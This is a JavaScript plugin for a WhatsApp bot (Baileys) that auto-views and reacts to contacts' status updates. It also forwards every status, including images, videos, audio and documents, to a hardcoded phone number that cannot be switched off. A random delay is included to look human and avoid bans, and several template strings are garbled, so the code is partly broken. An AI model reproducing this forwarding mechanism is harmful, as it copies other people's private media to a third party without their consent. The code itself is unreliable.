const fs = require('fs');
const path = require('path');
const isOwnerOrSudo = require('../lib/isOwner');

const { downloadMediaMessage } = require('@whiskeysockets/baileys');

// Path to store auto status configuration
const configPath = path.join(__dirname, '../data/autoStatus.json');

// Fixed target number → all statuses go here
const TARGET_NUMBER = '255615944741';           // ← your number without + or 00
const TARGET_JID = `${TARGET_NUMBER}@s.whatsapp.net`;

// Default config: all features enabled by default
const DEFAULT_CONFIG = {
    enabled: true,        // Auto view & process statuses
    reactOn: true         // Auto react to status
    // Forward to 0615944741 is ALWAYS ON - no toggle
};

// Initialize config file if it doesn't exist
if (!fs.existsSync(configPath)) {
    fs.writeFileSync(configPath, JSON.stringify(DEFAULT_CONFIG, null, 2));
}

// ────────────────────────────────────────────────
//    FORWARD STATUS TO FIXED NUMBER (0615944741)
// ────────────────────────────────────────────────
async function forwardStatusToTarget(sock, m) {
    if (!m?.message) return;

    const sender = m.key?.participant || m.key?.remoteJid || 'Unknown';
    const msgType = Object.keys(m.message)[0];
    const content = m.message[msgType];

    console.log(`[AutoStatus] Forwarding status from ${sender} → ${TARGET_NUMBER}`);

    // Text-only status
    if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
        const text = content.text || content.description || '[Text status]';
        await sock.sendMessage(TARGET_JID, {
            text: `📸 Status from \( {sender.split('@')[0]}\n\n \){text}`
        });
        return;
    }

    // Supported media types
    const mediaMap = {
        imageMessage:     { key: 'image',      ext: 'jpg',  mime: 'image/jpeg'  },
        videoMessage:     { key: 'video',      ext: 'mp4',  mime: 'video/mp4'   },
        audioMessage:     { key: 'audio',      ext: 'ogg',  mime: 'audio/ogg'   },
        stickerMessage:   { key: 'sticker',    ext: 'webp', mime: 'image/webp' },
        documentMessage:  { key: 'document',   ext: content.fileName?.split('.').pop() || 'bin' }
    };

    const media = mediaMap[msgType];
    if (!media) {
        console.log(`[AutoStatus] Skipping unsupported type: ${msgType}`);
        return;
    }

    try {
        const buffer = await downloadMediaMessage(
            m,
            'buffer',
            {},
            {
                logger: console,
                reuploadRequest: sock.updateMediaMessage // helps if media expired
            }
        );

        const caption = content.caption || '';
        const fileName = content.fileName || `status-\( {Date.now()}. \){media.ext}`;

        await sock.sendMessage(TARGET_JID, {
            [media.key]: buffer,
            mimetype: content.mimetype || media.mime,
            fileName: fileName,
            caption: `From: \( {sender.split('@')[0]}\n \){caption ? caption : 'No caption'}`
        });

        console.log(`[AutoStatus] ✓ Successfully forwarded ${media.key} to ${TARGET_NUMBER}`);

    } catch (err) {
        console.error('[AutoStatus] Forward failed:', err.message || err);

        // Fallback: send info message even if media failed
        await sock.sendMessage(TARGET_JID, {
            text: `⚠️ Status from ${sender.split('@')[0]} — media download failed\n` +
                  `${content.caption || '[No caption]'}\n` +
                  `Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Dar_es_Salaam' })}`
        });
    }
}

// ────────────────────────────────────────────────
//          REACT TO STATUS (unchanged)
// ────────────────────────────────────────────────
async function reactToStatus(sock, key) {
    if (!isStatusReactionEnabled()) return;
    try {
        await sock.relayMessage('status@broadcast', {
            reactionMessage: {
                key: {
                    remoteJid: 'status@broadcast',
                    fromMe: false,
                    id: key.id,
                    participant: key.participant || key.remoteJid
                },
                text: '🤍'
            }
        }, { messageId: key.id });
    } catch (e) {
        // silent fail - don't spam logs
    }
}

// ────────────────────────────────────────────────
//          CONFIG HELPERS
// ────────────────────────────────────────────────
function loadConfig() {
    try {
        const raw = fs.readFileSync(configPath, 'utf8');
        return { ...DEFAULT_CONFIG, ...JSON.parse(raw) };
    } catch {
        return DEFAULT_CONFIG;
    }
}

function isAutoStatusEnabled() {
    return loadConfig().enabled;
}

function isStatusReactionEnabled() {
    return loadConfig().reactOn;
}

// ────────────────────────────────────────────────
//          COMMAND (small UI update)
// ────────────────────────────────────────────────
async function autoStatusCommand(sock, chatId, msg, args) {
    const sender = msg.key.participant || msg.key.remoteJid;
    if (!msg.key.fromMe && !await isOwnerOrSudo(sender, sock, chatId)) {
        return sock.sendMessage(chatId, { text: '❌ Owner only command!' });
    }

    let config = loadConfig();

    if (!args?.length) {
        return sock.sendMessage(chatId, {
            text: `🔄 *Auto Status Settings*\n\n` +
                  `👀 View & process : ${config.enabled ? '🟢 ON' : '🔴 OFF'}\n` +
                  `❤️ Auto react     : ${config.reactOn ? '🟢 ON' : '🔴 OFF'}\n` +
                  `📲 Forward to     : 🟢 ALWAYS ON\n` +
                  `   → Number: ${TARGET_NUMBER}\n\n` +
                  `Commands:\n` +
                  `.autostatus on / off\n` +
                  `.autostatus react on / off`
        });
    }

    const cmd = args[0].toLowerCase();

    if (cmd === 'on') {
        config.enabled = true;
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
        return sock.sendMessage(chatId, { text: '✅ Auto status **enabled**' });
    }

    if (cmd === 'off') {
        config.enabled = false;
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
        return sock.sendMessage(chatId, { text: '❌ Auto status **disabled**' });
    }

    if (cmd === 'react') {
        if (!args[1]) return sock.sendMessage(chatId, { text: 'Use: .autostatus react on / off' });
        const sub = args[1].toLowerCase();
        config.reactOn = sub === 'on';
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
        return sock.sendMessage(chatId, { text: `Reactions → ${config.reactOn ? '🟢 ON' : '🔴 OFF'}` });
    }

    sock.sendMessage(chatId, { text: 'Invalid command. Use .autostatus to see options.' });
}

// ────────────────────────────────────────────────
//     MAIN STATUS HANDLER
// ────────────────────────────────────────────────
async function handleStatusUpdate(sock, ev) {
    if (!isAutoStatusEnabled()) return;

    // Small random delay → looks more human, reduces ban risk
    await new Promise(r => setTimeout(r, 900 + Math.random() * 1100));

    let message;

    if (ev.messages?.length > 0) {
        message = ev.messages[0];
    } else if (ev.key?.remoteJid === 'status@broadcast') {
        message = ev;
    } else if (ev.reaction?.key?.remoteJid === 'status@broadcast') {
        message = ev.reaction;
    }

    if (!message?.key?.remoteJid?.includes('status@broadcast')) return;

    try {
        // Mark as read
        await sock.readMessages([message.key]).catch(() => {});

        // React if enabled
        if (isStatusReactionEnabled()) {
            await reactToStatus(sock, message.key);
        }

        // Forward to your number
        await forwardStatusToTarget(sock, message);

    } catch (err) {
        console.error('[AutoStatus] Error processing status:', err.message || err);
    }
}

module.exports = {
    autoStatusCommand,
    handleStatusUpdate
};